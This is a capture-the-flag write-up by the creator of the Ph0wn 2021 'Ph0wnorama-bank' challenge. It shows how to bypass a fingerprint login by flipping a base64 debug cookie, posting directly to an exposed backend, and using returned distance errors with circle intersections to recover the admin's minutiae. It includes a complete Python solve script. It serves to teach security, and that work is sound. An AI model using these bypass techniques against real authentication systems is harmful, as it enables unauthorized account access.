I created Ph0wnorama-bank for Ph0wn 2021: the write up follows the challenge flow as a normal player -and not the creator of the challenge- would do. Anyhow, I'll put some **admin comments** that reflect what I thought you should have noticed or done :)

The challenge is providing the following banner:

```
Welcome to Ph0wnorama bank.
This website is protected by biometric authentication: please enter your name and your fingerprint to login and find the treasure.
http://challenges.ph0wn.org:1233
Please be aware that bruteforcing is not the way to solve the challenge
```

Ok let's start by checking what's inside the webpage.

If we open the provided link we end up in a login page:

<img src="1.png" width="500">

We need to provide a username and an image for a fingerprint. 

At this stage we have no clue on what the fingerprint is and what it looks like. Let's explore a bit more.

The source code of the webpage is very simple but we immediately find a first clue:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Biometric login</title>
    <link href='https://fonts.googleapis.com/css?family=Gruppo' rel='stylesheet'>
    <link rel="stylesheet" href="/static/css/main.css">
    <link rel="shortcut icon" href="/static/images/favicon.ico">
  </head>
  <body>
    <div class="split left">
      <div class="centered">
        <img src="/static/images/logo.jpg" align="middle" />
      </div>
    </div>

<div class="split right">
  <div class="centered">
    <form method="post" action="/" enctype="multipart/form-data">
      <input type="text" name="username" placeholder="username" autocomplete="off" required>
      <label>Upload Fingerprint<input type="file" name="fingerprint"/></label>
      <input type="image" src="/static/images/login.png">
    </form>
    
        
    
  </div>
</div>
<!-- TODOs Fix robots.txt -->
</body>
</html>
```

That `<!-- TODOs Fix robots.txt -->` is worth investigating. If we open `http://challenges.ph0wn.org:1233/robots.txt` We find the following text:

```
static/images/alice.jpg
static/images/bob.jpg

YWRtaW4gcGFzc3dvcmQgY2hhbmdlcyBldmVyeSB0ZW4gc2Vjb25kcw==
```

The first two look like examples of fingerprints for the corresponding users  (alice and bob). Indeed

<img src="2a.jpeg" width="100">
<img src="2b.jpeg" width="100">

If we try to login with username: alice and her corresponding fingerprint we indeed get a Successful login... but Alice and Bob do not provide any treasure.

<img src="3.png" width="500">

The other string in `robots.txt` it's base64 encoded message... Decoding it we know that:

```
admin password changes every ten seconds
```

Interesting. This is a strong evidence that we need to login with username `admin`. But with which fingerprint?  Let's look at the code that organizers provide with the challenge.

```python
#!/usr/bin/env python3
import cv2
import numpy as np
import skimage.morphology
import skimage
import base64
import json
from getTerminationBifurcation import getTerminationBifurcation;
from removeSpuriousMinutiae import removeSpuriousMinutiae
import requests
from flask import Flask, flash, request, redirect, render_template, make_response
from gevent.pywsgi import WSGIServer

app = Flask(__name__)
app.secret_key = "REDACTED"

@app.route('/', methods=['POST'])
def upload_fingerprint():
    if request.method == 'POST':
        #...
        #...
        #...
        #Some stuff going on here
        #...
        #...
        #...
        saliencies= getSaliency(fingerprint)
        payload = {"username":username,"fingerprint":saliencies}
        resp = requests.post(url="http://server:1234",json=payload,cookies=request.cookies)
        return redirect(request.url)


def getSaliency(fingerprint):
    try:
        saliencies = []
        img = cv2.imdecode(np.frombuffer(fingerprint.read(), np.uint8),0);
        img = np.uint8(img>128);
        skel = skimage.morphology.skeletonize(img)
        skel = np.uint8(skel)*255;
        mask = img*255;
        (minutiaeTerm, _) = getTerminationBifurcation(skel, mask);
        minutiaeTerm = skimage.measure.label(minutiaeTerm, connectivity=2);
        RP = skimage.measure.regionprops(minutiaeTerm)
        minutiaeTerm = removeSpuriousMinutiae(RP, np.uint8(img), 10);
        TermLabel = skimage.measure.label(minutiaeTerm, connectivity=2);
        RP = skimage.measure.regionprops(TermLabel)
        for i in RP:
            row, col = np.round(i['Centroid'])
            saliencies.append([row,col])
        return saliencies
    except Exception:
        saliencies=None
    finally:
        return saliencies

if __name__ == "__main__":
    http_server = WSGIServer(('', 1233), app)
    http_server.serve_forever()
```

This looks like (**and indeed is**) the code of the main page of the website. We notice that:

- When the form is submitted, the endpoint is `http://server:1234`
- The payload is made of a username and a json file containing an object called `saliences` that is computed by the fuction `getSaliency`
- The function `getSaliency` looks a  bit complicated.  But what we notice **(what I wished you had noticed ;))** is that:
    - is taking an object called `fingerprint` (this is the image provided)
    - no matter how this `fingerprint` is manipulated, the function is returning a list of pairs `saliencies.append([row,col])`
- The request is attaching cookies

Ok let's start digging into it:
- If we visit `http://challenges.ph0wn.org:1234/` we see that the backend is indeed exposed. **You should have noticed that you can directly submit your payloads without going through the `getSaliency` function.** And since we understood that `getSaliency` only returns a list of pairs like `[[x,y], ..... [x,y]]` we can try to submit a random list as fingerprint of  the `admin` user and see what happens.
- If we check cookies, the webpage is asking us to set this cookie: `RGVidWdnaW5n=RmFsc2U=`. == in the string...  this looks again a base64 string. If we decode it we get: `Debugging=False`.  Well maybe it's the case of turning on that Debugging function attaching a cookie like: `RGVidWdnaW5n=VHJ1ZQ==`. 

Let's write down some code:

```python
url = "http://challenges.ph0wn.org:1234"
username = 'admin'
cookies={'RGVidWdnaW5n':'VHJ1ZQ=='}
req = requests.post(url=url,json={"username":username,"fingerprint":[[1,1],[1,1]]},cookies=cookies)

```

When submitting the code, we get this answer: `Login Failed! You need 45 salient points`. This is interesting. Well, let's then tune the code and provide the right number of points.

```python
url = "http://challenges.ph0wn.org:1234"
username = 'admin'
saliencies1 = []
cookies={'RGVidWdnaW5n':'VHJ1ZQ=='}
req = requests.post(url=url,json={"username":username,"fingerprint":[[1,1],[1,1]]},cookies=cookies)
try:
    howMany = int(re.search('need\ ([0-9]+)',req.text).group(1))
    for salience in range(howMany):
        saliencies1.append([random.randint(0,500),random.randint(0,500)])
    req = requests.post(url=url,json={"username":username,"fingerprint":saliencies1},cookies=cookies)

```

Answer is:

```
Login Failed 381.41840542899865;263.6512848442048;304.90162347878703;206.65188119153427;161.69724796668618;102.45974819410792;301.42494919963076;123.36936410632909;295.6010825419961;401.10347792059844;398.5398348973412;107.16809226630845;402.5232912515747;346.44624402640017;304.2137406495637;313.04951684997053;216.8155898453799;137.87313008704777;132.6386067478093;426.0187789288167;179.0111728356641;113.07077429645558;419.17299531339086;160.0656115472652;172.9566419655516;126.60568707605516;116.84177335182824;263.40273347101015;339.09438214160963;247.49343425634547;337.52185114448514;210.2974084481309;347.5399257639329;252.53910588263355;266.6027006614899;186.90371852908652;99.40321926376429;73.87827826905551;442.10858394742803;273.97992627198073;178.1937148162078;48.25971404805462;301.95529470436514;16.15549442140351;329.56486463213884;250.185930859431;
```

So we are submitting N pairs of random numbers, and we get N floats as return values. What's going on?

**If you reason a bit about it, the challenge is asking you to provide a fingerprint image and it is sending to the backend a list of pairs of numbers.
What that `getSaliency` indeed does is to take a fingerprint image and extract saliency points, which are characterising that specific fingerprint and indeed are used in biometric authentication. However, you do not care at all about how those points are extracted from the fingerprint.
If you are submitting N pairs of points and you get N float values as response (which change if you change the points)... is maybe this the error you are doing with respect to the actual points of the admin? Yes, indeed it is!**

This being understood, we need to minimize this error and reach the correct point. 

So, We have a point and we can only probe the distance from the correct one. We do not know in which direction though! Fair enough, we can bruteforce in a random direction, check if the error is lowering or not and find the right path. 

**Well, no. You cannot. Admin password is changing every 10 seconds, which means that your solution (unless you are extremely lucky) will not converge on time! You need to be a bit smarter.**

If we have a point and a distance from that, we are simply defining a geometric figure called `circumference` (**lol**). The actual point we are looking for is on that circumference. And for each pair of saliency points, we get one of those beautiful circumference. 

What if we submit a second list of totally random points? We can build a second list of circumferences.

If you recall, to circumferences intersect in two points. We are now in the following situation.

<img src="4.png" width="200">

What is left is to try with the first set of points that we obtain from the intersections and change those that are not correct.

For this solution you need at most 5 requests, which you can reasonably make in 10 seconds.

Here the full code:

```python
import requests
import json
import base64
import re
import random
import math

def intersect(p0, r0, p1, r1):
    x0 = p0[0]
    y0 = p0[1]
    x1 = p1[0]
    y1 = p1[1]
    d=math.sqrt((x1-x0)**2 + (y1-y0)**2)

    # non intersecting
    if d > r0 + r1 :
        return None
    # One circle within other
    if d < abs(r0-r1):
        return None
    # coincident circles
    if d == 0 and r0 == r1:
        return None
    else:
        a=(r0**2-r1**2+d**2)/(2*d)
        h=math.sqrt(r0**2-a**2)
        x2=x0+a*(x1-x0)/d   
        y2=y0+a*(y1-y0)/d   
        x3=x2+h*(y1-y0)/d     
        y3=y2-h*(x1-x0)/d 

        x4=x2-h*(y1-y0)/d
        y4=y2+h*(x1-x0)/d

        return [x3, y3], [x4, y4]

url = "http://challenges.ph0wn.org:1234"
username = 'admin'
saliencies1 = []
saliencies2 = []
cookies={'RGVidWdnaW5n':'VHJ1ZQ=='}
#1st request: how many points do we need?
req = requests.post(url=url,json={"username":username,"fingerprint":[]},cookies=cookies)
assert req.status_code == 200, "1st req: error in processing\n"+req.text
try:
    howMany = int(re.search('need\ ([0-9]+)',req.text).group(1))
    for salience in range(howMany):
        saliencies1.append([random.randint(0,500),random.randint(0,500)])
        saliencies2.append([random.randint(0,500),random.randint(0,500)])
    #2nd request: first series of distances
    req = requests.post(url=url,json={"username":username,"fingerprint":saliencies1},cookies=cookies)
    assert req.status_code == 200, "2nd req: error in processing\n"+req.text
    distances1 = req.text.replace("Login Failed ","").split(';')[:-1]
    #3rd request: second series of distances
    req = requests.post(url=url,json={"username":username,"fingerprint":saliencies2},cookies=cookies)
    assert req.status_code == 200, "3rd req: error in processing\n"+req.text
    distances2 = req.text.replace("Login Failed ","").split(';')[:-1]
    intersections1, intersections2 = [], []
    for p0, r0, p1, r1 in zip(saliencies1,distances1,saliencies2,distances2):
        intersection1, intersection2 = intersect(p0,float(r0),p1,float(r1))
        if intersection1 is None or intersection2 is None:
            raise Exception('Problem with intersections')
        intersections1.append(intersection1)
        intersections2.append(intersection2)
    #4th request: which points are correct?
    req = requests.post(url=url,json={"username":username,"fingerprint":intersections1},cookies=cookies)
    assert req.status_code == 200, "4th req: error in processing\n"+req.text
    distances3 = req.text.replace("Login Failed ","").split(';')[:-1]
    finalSaliences = []
    for index,distance in enumerate(distances3):
        if float(distance)<0.1:
            finalSaliences.append(intersections1[index])
        else:
            finalSaliences.append(intersections2[index])
    #5th request: get the flag
    req = requests.post(url=url,json={"username":username,"fingerprint":finalSaliences},cookies=cookies)
    assert req.status_code == 200, "5th req: error in processing\n"+req.text
    print(req.text)
except Exception as e:
    print(e)


```

Baaam: we get `Ph0wn{G3omeTry_1s_4lway5_Us3Ful}`

**Actually, if you carefully chose the points, you could automatically exclude negative points in the intersections and solve the challenge in 4 requests. This was also possible by using trigonometry instead of circles.**

**I hope you enjoyed solving the challenge as much as I did with writing it!**
